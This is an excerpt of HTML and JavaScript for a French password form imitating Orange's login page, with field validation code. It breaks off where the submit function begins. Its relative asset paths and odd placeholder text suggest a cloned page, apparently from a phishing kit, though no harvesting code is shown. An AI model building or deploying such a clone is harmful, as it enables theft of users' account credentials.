                    ...
                    <div id="stage-2" class="eui-st2">
                        ...
                        <div class="eui-identity-area">
                            <div class="x-col-avatar">
                                <div class="eui-avatar">
                                    <div class="eui-svg eui-icon-avatar"id="accountAvatar" title="Avatar d’utilisateur"></div>
                                </div>
                            </div>
                            <div class="x-col-identity">
                                <div class="x-identity">
                                    <p class="x-dsn eui-dsn eui-ellipsis"  id="accountLogin">votre mot de passe orange</p>
                                </div>
                                <div class="pass-user">
                                    <label>Changer de compte</label><img pass-user-img src="assets/img/right-arrow.png"></a>
                                </div>
                            </div>
                        </div>
                        ...
                        <div class="form-group ">
                            ...
                            <div class="placeholderContent">
                                <div class="form-span">
                                    <span class="span-placeholder" id="">Mot de passe</span>
                                    <span class="pass-eye"><div class="eye-img eye-img-hide"></div></span>
                                </div>
                                <input type="password" name="password" id="password" class="form-control form-pass" maxlength="36" required="">
                                <div class="pass-warning warning-section">
                                    <div class="pass-warning-img"><img src="./assets/img/alert_severe.png"></div>
                                    <div class="pass-warning-description">Vérifiez l’adresse mail et le mot de passe saisis.</div>
                                </div>
                            </div>
                        </div>
                        ...
                        <div class="button-text">
                            <button id="submitbutton" type="button" class="btn btn-primary eui-btn-sub" onclick="submitlogin()">S’identifier
                               ...
                               <div class="pass-button">
                                    <label>Changer de compte</label><img pass-user-img src="assets/img/right-arrow.png"></a></div>
                                </div>
                        </div>
...
<script type="text/javascript">
    ...
    function check_password(id){
        ...
        if(password.match(passwnum) && isNaN(password[0])) {
            ...
            $(".span-placeholder").css("color", "red");
            $(".form-pass").css("border-bottom", "2px solid red");
            $(".warning-section").removeClass("pass-warning");
            $(".warning-section").addClass("pass-warning-show");
            $('#'+id).addClass('error');return false;

        }

    }
    function submitlogin(){
        // alert(check_password('password'));
